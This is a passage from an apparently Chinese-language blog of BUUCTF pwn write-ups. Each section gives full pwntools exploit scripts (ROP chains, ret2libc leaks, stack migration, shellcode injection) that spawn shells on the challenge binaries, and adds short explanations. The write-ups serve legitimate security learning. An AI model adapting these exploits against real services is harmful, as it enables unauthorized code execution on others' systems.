dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80</span><br><span class="line"></span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2d-picoctf-2018-buffer-overflow-2"><a href="#0x2d-picoctf-2018-buffer-overflow-2" class="headerlink" title="0x2d.picoctf_2018_buffer overflow 2"></a>0x2d.picoctf_2018_buffer overflow 2</h2><p><code>32位传参</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/47&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26608</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_虚拟机共享文件夹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x080485CB</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x04</span>) + p32(win_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0xDEADBEEF</span>) + p32(<span class="number">0xDEADC0DE</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please enter your string: \n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2e-cmcc-simplerop"><a href="#0x2e-cmcc-simplerop" class="headerlink" title="0x2e.cmcc_simplerop"></a>0x2e.cmcc_simplerop</h2><p><code>ret2syscall &amp; mprotect &amp; 静态链接</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/48&quot;</span>)</span><br><span class="line"><span class="comment"># c =remote(&#x27;node4.buuoj.cn&#x27;,28081)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_虚拟机共享文件夹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x0806D870</span></span><br><span class="line">start_addr = <span class="number">0x80e9000</span> </span><br><span class="line">main_addr = <span class="number">0x08048E24</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Your input :&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span>) + p32(mprotect_addr) + p32(main_addr) + p32(start_addr) + p32(<span class="number">0x1000</span>) + p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Your input :&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x18</span>) + p32(read_addr) + p32(start_addr) + p32(<span class="number">0</span>) + p32(start_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># gdb.attach(c)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------<span class="comment">#syscall</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret =<span class="number">0x0806e850</span></span><br><span class="line">int80 = <span class="number">0x080493e1</span></span><br><span class="line">read_addr= <span class="number">0x0806CD50</span></span><br><span class="line">bss_addr = <span class="number">0x080EB584</span></span><br><span class="line">main_addr = <span class="number">0x08048E24</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(read_addr) +p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">11</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(int80) </span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>其中第二个payload偏移发生了变化。</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.5k0e6b9mxh8g.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.412xvqxjvmkg.webp"></p><p>​    经过动调，第二次的溢出偏移为<code>0x18</code></p><h2 id="0x2f-bbys-tu-2016"><a href="#0x2f-bbys-tu-2016" class="headerlink" title="0x2f.bbys_tu_2016"></a>0x2f.bbys_tu_2016</h2><p><code>ret2text &amp; padding</code></p><p>​    ida中的地址不准确，使用了<code>cyclic</code>计算偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27706</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">print_flag = <span class="number">0x0804856D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">24</span>) + p32(print_flag)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x30-xdctf2015-pwn200"><a href="#0x30-xdctf2015-pwn200" class="headerlink" title="0x30.xdctf2015_pwn200"></a>0x30.xdctf2015_pwn200</h2><p><code>ret2libc3 -x86</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/50&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25787</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/50&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc32.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(c.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh) </span><br><span class="line"><span class="comment"># c.recvuntil(b&#x27;Welcome to XDCTF2015~!\n&#x27;)  # 第二次不会打印这条信息，因为buf已经被更改了</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x31-wustctf2020-getshell-2"><a href="#0x31-wustctf2020-getshell-2" class="headerlink" title="0x31.wustctf2020_getshell_2"></a>0x31.wustctf2020_getshell_2</h2><p><code>ret2libc1 &amp; call between plt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/51&quot;</span>)</span><br><span class="line"><span class="comment"># c =remote(&#x27;node4.buuoj.cn&#x27;,25355)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/51&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">system_call = <span class="number">0x08048529</span></span><br><span class="line">system_plt = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = <span class="number">0x08048670</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(c)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1c</span> + p32(system_call) + p32(sh)</span><br><span class="line"><span class="comment"># payload = b&#x27;b&#x27;*0x1c + p32(system_plt) + p32(sh)</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>但是没法利用<code>system@plt</code>地址，因为plt地址需要返回值，可溢出的地址位数不够<code>0x24-0x18=0xc</code>，所以只能用<code>shell()</code>里的<code>call system</code>来调用system，call函数不用返回值了，它会自己把下一条指令给压进去。</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.4eu7ap6bmn8.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.6m2td8llggw0.webp"></p><h2 id="0x32-mrctf2020-easyoverflow"><a href="#0x32-mrctf2020-easyoverflow" class="headerlink" title="0x32.mrctf2020_easyoverflow"></a>0x32.mrctf2020_easyoverflow</h2><p><code>interesting overflow</code></p><p>​    一开始我的思路错了，我开始在程序里面去找存放<code>fake_flag</code>的值<code>n0t_r3@11y_f1@g</code>的地址，找到了在data段的<code>0x944</code>但是传入后却得到的参数不是我们需要的值，在借鉴其他payload之后才发现我们原来是可以直接覆写的，挺有意思涨知识了！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26912</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">b&#x27;n0t_r3@11y_f1@g&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + real_flag</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230309/%E5%9B%BE%E7%89%87.15tq7l71waw0.webp"></p><h2 id="0x33-ZJCTF-2019-Login"><a href="#0x33-ZJCTF-2019-Login" class="headerlink" title="0x33.[ZJCTF 2019]Login"></a>0x33.[ZJCTF 2019]Login</h2><p><code>ret2eax</code></p><p>​    保护全开，麻人的C++伪代码，ROP新知识点<code>ret2eax</code></p><p>​    利用<code>\x00</code>截断<code>strcmp函数</code>，但是不知道为什么后面字符填充的时候也只有用<code>\x00</code>填充才能打得通，估计是涉及到某些字符串函数了吧？总之这道题也让我涨知识很多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26019</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0400E88</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please enter username: &#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please enter password: &#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x60</span>-<span class="number">0x18</span>-<span class="built_in">len</span>(<span class="string">b&#x27;2jctf_pa5sw0rd&#x27;</span>))+ p64(backdoor)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x34-ciscn-2019-s-4"><a href="#0x34-ciscn-2019-s-4" class="headerlink" title="0x34.ciscn_2019_s_4"></a>0x34.ciscn_2019_s_4</h2><p><code>Stack Migration x86</code></p><p>​    这道题和前面的那道一样，但是理解更深入更容易了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26335</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/54&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">c.send(payload)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp = u32(c.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># leak real ebp</span></span><br><span class="line">log.success(<span class="string">&#x27;The Real EBP :&#x27;</span> + <span class="built_in">hex</span>(ebp))</span><br><span class="line">buf_addr = ebp - <span class="number">0x38</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment"># Added stack</span></span><br><span class="line">payload = p32(sys_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf_addr+ <span class="number">4</span>*<span class="number">3</span>) + <span class="string">b&quot;sh&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># rest paddings + ebp + eip</span></span><br><span class="line">payload += (<span class="number">0x28</span> - <span class="built_in">len</span>(payload))* <span class="string">b&#x27;\0&#x27;</span> + p32(buf_addr-<span class="number">4</span>) + p32(leave_ret) </span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><mark>难点：</mark></p><ol><li><code>padding = 0x38</code></li></ol><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230309/%E5%9B%BE%E7%89%87.16kidbyf9oxs.webp"></p><ol start="2"><li><code>buf_addr+ 4*3</code> : <code>system</code> 的参数指向<code>sh</code>的地址，从而<code>system(&#39;/bin/sh&#39;)</code></li></ol><h2 id="0x35-jarvisoj-level1"><a href="#0x35-jarvisoj-level1" class="headerlink" title="0x35.jarvisoj_level1"></a>0x35.jarvisoj_level1</h2><p><code>ret2shellcode &amp; ret2libc3</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230309/%E5%9B%BE%E7%89%87.6uq99m19va4g.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/55&quot;</span>)</span><br><span class="line"><span class="comment"># c =remote(&#x27;node4.buuoj.cn&#x27;,25119)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/55&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;:0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(c.recvline()[<span class="number">0</span>:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">payload = shellcode + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8c</span>-<span class="built_in">len</span>(shellcode)) + p32(buf_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    因为平台并不是先发送的<code>buf</code>地址，故这种方法只能在本地打通。那么直接使用<code>ret2libc3</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/55&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25119</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/55&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc32.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">140</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span 